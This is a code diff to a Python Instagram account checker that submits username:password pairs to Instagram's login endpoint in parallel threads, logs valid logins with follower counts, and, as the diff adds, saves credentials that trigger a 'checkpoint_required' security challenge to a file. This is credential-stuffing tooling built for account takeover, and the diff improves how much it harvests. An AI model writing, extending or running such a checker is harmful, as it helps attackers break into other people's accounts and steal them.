@@ -56,7 +56,7 @@ class Main:
 
     def TitleUpdate(self):
         while True:
-            self.SetTitle('One Man Builds Instagram Checker Tool ^| HITS: {0} ^| BADS: {1} ^| RETRIES: {2} ^| THREADS: {3}'.format(self.hits,self.bads,self.retries,active_count()-1))
+            self.SetTitle('One Man Builds Instagram Checker Tool ^| HITS: {0} ^| CHALLENGES: {1} ^| BADS: {2} ^| RETRIES: {3} ^| THREADS: {4}'.format(self.hits,self.challenges,self.bads,self.retries,active_count()-1))
             sleep(0.1)
 
     def __init__(self):
@@ -83,6 +83,7 @@ class Main:
         """
         print(self.title)
         self.hits = 0
+        self.challenges = 0
         self.bads = 0
         self.retries = 0
         self.ua = UserAgent()
@@ -144,8 +145,7 @@ class Main:
                 response = session.post(auth_link,headers=headers,data=payload)
 
             json_data = json.loads(response.text)
-
-            if 'authenticated' in json_data:
+            if 'authenticated' in response.text:
                 if json_data['authenticated'] == True:
                     followers = self.GetInstaFollowersNum(username)
                     self.PrintText(Fore.CYAN,Fore.RED,'HIT',f"{username}:{password} | FOLLOWERS: {followers}")
@@ -160,6 +160,11 @@ class Main:
                 else:
                     self.retries = self.retries+1
                     self.InstagramCheck(username,password)
+            elif 'checkpoint_required' in response.text:
+                self.PrintText(Fore.CYAN,Fore.RED,'CHALLENGE',f"{username}:{password}")
+                with open('challenges.txt','a',encoding='utf8') as f:
+                    f.write('{0}:{1}\n'.format(username,password))
+                self.challenges = self.challenges+1
             else:
                 self.retries = self.retries+1
                 self.InstagramCheck(username,password)
